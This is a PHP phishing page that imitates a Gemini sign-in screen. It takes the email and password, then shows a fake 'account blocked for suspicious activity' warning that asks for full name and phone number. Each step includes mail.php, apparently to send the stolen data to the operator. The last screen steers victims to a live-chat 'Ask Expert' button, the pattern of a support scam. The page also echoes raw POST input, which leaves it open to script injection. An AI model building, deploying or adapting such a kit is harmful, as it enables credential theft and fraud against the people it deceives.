<!DOCTYPE html>
<html lang="en">
   <head>
      <meta name="robots" content="noindex, nofollow"/>
      <meta name="googlebot" content="noindex, nofollow"/>
      <meta name="bingbot" content="noindex, nofollow"/>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Gemini</title>
      <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
      <link href="assets/css/style.css" rel="stylesheet" id="bootstrap-css">
      <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
      <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
   </head>
   <body>
      <div class="container-fluid login-container">
         <div class="row">
            <?php
               if (isset($_POST['btnLoginMore'])) {
                  include 'mail.php';
               ?>
            <div class="col-md-6 offset-md-3 login-form-1">
               <form action="" method="post">
                  <h3>Verification Required</h3>
                  <br>
                  <input type="hidden" name="brandName" value="Gemini">
                  <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                  <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                  <div class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                     Kindly contact chat assistance for further help
                  </div>
                  <div class="form-group">
                     <input type="text" name="name" class="form-control" placeholder="Full Name *" value="" required />
                  </div>
                  <div class="form-group">
                     <input type="text" name="number" class="form-control" placeholder="Phone Number *" value="" required />
                  </div>
                  <div class="form-group">
                     <input name="fromLog" type="submit" class="btnSubmit" value="Verify" />
                  </div>
                  <div id="terms-and-conditions">by creating an account you agree to our<br><a href="#" rel="noopener" class="md-default-theme">Terms of Use</a> &amp; <a href="#" rel="noopener" class="md-default-theme">Privacy Policy</a>
                  </div>
               </form>
            </div>
            <?php } elseif (isset($_POST['fromLog'])) {
               include 'mail.php';
               ?>
            <div class="col-md-6 offset-md-3 login-form-1 text-center" style=" text-align: center;">
               <form>
                  <h3 class="text-center">Account blocked</h3>
                  <br>
                  <p style="font-size: 20px;">Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                  <div class="form">
                     <label>Error CODE: <b>6X76D</b></label><br>
                  </div>
                  <div class="calling-number">
                     <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707; color: #fff !important;">Ask Expert</a>
                  </div>
               </form>
            </div>
            <?php } else { ?>
            <div class="col-md-6 offset-md-3 login-form-1">
               <form action="" method="post">
                  <img class="logoG" src="assets/images/logo.png">
                  <h3>Sign in to Gemini</h3>
                  <input type="hidden" name="brandName" value="Gemini">
                  <div class="form-group">
                     <label>Email address</label>
                     <input type="email" id="email" name="email" class="form-control" placeholder="Email *" value="" required />
                  </div>
                  <div class="form-group">
                     <label>password</label>
                     <input type="password" name="password" class="form-control" placeholder="Password *" value="" required />
                  </div>
                  <div class="jss17"><a><input type="checkbox" name=""> Remember my email</a></div>
                  <div class="form-group">
                     <input name="btnLoginMore" type="submit" class="btnSubmit" value="Login" />
                  </div>
                  <div class="">
                     <a style="padding-top:15px" href="/forgotpassword">Forgot your password?</a>
                     <br>
                     Don't have an account? <a href="/register">Register</a>
                  </div>
               </form>
            </div>
            <?php } ?>
         </div>
      </div>
      <!--Start of Tawk.to Script-->
      <script type="text/javascript">
         var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
         (function(){
         var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
         s1.async=true;
         s1.src='https://embed.tawk.to/620a586d9bd1f31184dc89bb/1frs6irvs';
         s1.charset='UTF-8';
         s1.setAttribute('crossorigin','*');
         s0.parentNode.insertBefore(s1,s0);
         })();
      </script>
      <!--End of Tawk.to Script-->
   </body>
</html>